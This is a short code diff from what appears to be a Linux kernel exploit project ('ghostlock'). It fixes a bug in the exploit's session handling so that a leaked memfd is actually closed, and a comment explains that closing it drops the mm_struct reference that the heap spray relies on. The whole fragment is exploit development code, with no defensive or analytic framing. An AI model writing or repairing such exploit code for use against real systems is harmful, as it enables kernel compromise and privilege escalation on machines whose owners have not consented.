@@ -659,8 +659,11 @@ namespace ghostlock::support {
         sched_yield();
         sched_yield();
         sched_yield();
+        /* Reap the snitch child's memfd: closing it is what drops the
+         * mm_struct reference the spray depends on (the previous SYSCHK_pr
+         * expansion dropped the close call). */
         const int32_t leak_fd = session::g_exploit_session.heap.leak_memfd.release();
-        if (leak_fd == -1) {
+        if (close(leak_fd) != 0) {
             pr_error("SYSCHK(close(memfd_leak)): %m\n");
         }
         session::g_exploit_session.heap.leak_memfd.reset();
